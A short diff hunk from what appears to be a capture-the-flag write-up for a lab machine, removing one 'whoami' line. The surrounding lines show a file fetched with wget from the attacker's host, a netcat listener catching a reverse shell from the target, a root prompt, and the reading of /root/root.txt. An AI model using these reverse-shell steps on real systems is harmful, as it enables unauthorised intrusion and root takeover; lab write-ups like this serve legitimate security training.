@@ -171,7 +171,6 @@ jippity@blurry:~$ wget http://10.10.x.x/demo.pth
 nc -lvnp 6060
 listening on [any] 6060 ...
 connect to [10.10.x.x] from (UNKNOWN) [10.10.11.19] 57082
-# whoami
 root
 # cat /root/root.txt
 ```
